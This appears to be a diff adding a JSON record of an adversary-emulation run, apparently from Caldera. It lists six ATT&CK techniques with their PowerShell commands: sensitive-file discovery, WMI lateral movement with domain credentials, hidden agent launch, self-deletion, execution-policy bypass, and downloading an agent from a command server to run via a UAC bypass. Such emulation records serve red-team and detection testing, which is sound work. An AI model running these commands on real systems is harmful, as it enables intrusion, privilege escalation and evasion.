@@ -1,0 +1,177 @@
+{
+  "operation_id": "cbf70d14-3044-4219-afdf-204edb44c45f",
+  "operation_name": "apt-sim-20260402-095335",
+  "technique_count": 6,
+  "techniques": [
+    {
+      "technique_id": "T1005",
+      "technique_name": "Find files",
+      "tactic": "collection",
+      "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+      "ability_name": "Find files",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "0",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "proc,cmd,psh",
+        "{'name': 'psh', 'platform': 'windows', 'command': \"Get-ChildItem C:\\\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\\nexit 0;\", 'code': None, 'language': None, 'build_target': None, 'payloads': [], 'uploads': [], 'timeout': 60, 'parsers': [{'module': 'plugins.stockpile.app.parsers.basic', 'parserconfigs': [{'source': 'host.file.path', 'edge': 'has_extension', 'target': 'file.sensitive.extension', 'custom_parser_vals': {}}]}], 'cleanup': [], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;"
+      ],
+      "d3fend": []
+    },
+    {
+      "technique_id": "T1105",
+      "technique_name": "Install PowerShell Core 6",
+      "tactic": "command-and-control",
+      "ability_id": "60f63260-39bb-4136-87a0-b6c2dca799fc",
+      "ability_name": "Install PowerShell Core 6",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "1",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "proc,cmd,psh",
+        "{'name': 'psh', 'platform': 'windows', 'command': '$wc=New-Object System.Net.WebClient;\\n$output=\"PowerShellCore.msi\";\\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\\n$env:Path += \";C:\\\\Program Files\\\\Powershell\\\\6\";\\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group}\" -WindowStyle hidden;', 'code': None, 'language': None, 'build_target': None, 'payloads': [], 'uploads': [], 'timeout': 60, 'parsers': [], 'cleanup': ['rm PowerShellCore.msi;'], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group}\" -WindowStyle hidden;"
+      ],
+      "d3fend": []
+    },
+    {
+      "technique_id": "T1070.004",
+      "technique_name": "Deadman - Delete agent file",
+      "tactic": "defense-evasion",
+      "ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "ability_name": "Deadman - Delete agent file",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "0",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "proc,cmd,psh",
+        "{'name': 'psh', 'platform': 'windows', 'command': '$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;\\n$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;\\n$processClass = Get-CimClass -ClassName Win32_Process;\\nInvoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{\\n    Commandline = \\'cmd.exe /c \"timeout /nobreak /t 10 >nul 2>nul & del /f #{location}\"\\';\\n    ProcessStartupInformation = [CimInstance]$startupInfo\\n};', 'code': None, 'language': None, 'build_target': None, 'payloads': [], 'uploads': [], 'timeout': 60, 'parsers': [], 'cleanup': [], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;\n$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;\n$processClass = Get-CimClass -ClassName Win32_Process;\nInvoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{\n    Commandline = 'cmd.exe /c \"timeout /nobreak /t 10 >nul 2>nul & del /f #{location}\"';\n    ProcessStartupInformation = [CimInstance]$startupInfo\n};"
+      ],
+      "d3fend": []
+    },
+    {
+      "technique_id": "T1047",
+      "technique_name": "Start 54ndc47 (WMI)",
+      "tactic": "execution",
+      "ability_id": "ece5dde3-d370-4c20-b213-a1f424aa8d03",
+      "ability_name": "Start 54ndc47 (WMI)",
+      "origins": [
+        "planned_compatible"
+      ],
+      "statuses": [
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "proc,cmd,psh"
+      ],
+      "commands": [
+        "$node = '''#{remote.host.fqdn}''';\n$user = '''#{domain.user.name}''';\n$password = '''#{domain.user.password}''';\nwmic /node:$node /user:$user /password:$password process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";"
+      ],
+      "d3fend": []
+    },
+    {
+      "technique_id": "T1059.001",
+      "technique_name": "Emulate Administrator Tasks",
+      "tactic": "execution",
+      "ability_id": "315cedf1-4a3a-4015-b63f-149d64bacbbc",
+      "ability_name": "Emulate Administrator Tasks",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "0",
+        "1",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "proc,cmd,psh",
+        "{'name': 'psh', 'platform': 'windows', 'command': 'start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\\\Emulate-Administrator-Tasks.ps1\"', 'code': None, 'language': None, 'build_target': None, 'payloads': ['Emulate-Administrator-Tasks.ps1'], 'uploads': [], 'timeout': 60, 'parsers': [], 'cleanup': ['Remove-Item -Force -Path \".\\\\Emulate-Administrator-Tasks.ps1\"'], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\""
+      ],
+      "d3fend": []
+    },
+    {
+      "technique_id": "T1548.002",
+      "technique_name": "Bypass UAC Medium",
+      "tactic": "privilege-escalation",
+      "ability_id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
+      "ability_name": "Bypass UAC Medium",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "0",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "proc,cmd,psh",
+        "{'name': 'psh', 'platform': 'windows', 'command': '$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\\\Users\\\\Public\\\\$name.exe\",$data);\\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\\\Users\\\\Public\\\\$name.exe -group #{group}\"; };\\nReceive-Job -Job $job -Wait;', 'code': None, 'language': None, 'build_target': None, 'payloads': ['Bypass-UAC.ps1'], 'uploads': [], 'timeout': 60, 'parsers': [], 'cleanup': [], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;"
+      ],
+      "d3fend": []
+    }
+  ],
+  "attack_ids": [
+    "T1005",
+    "T1047",
+    "T1059.001",
+    "T1070.004",
+    "T1105",
+    "T1548.002"
+  ],
+  "d3fend_map": {
+    "T1005": [],
+    "T1047": [],
+    "T1059.001": [],
+    "T1070.004": [],
+    "T1105": [],
+    "T1548.002": []
+  }
+}
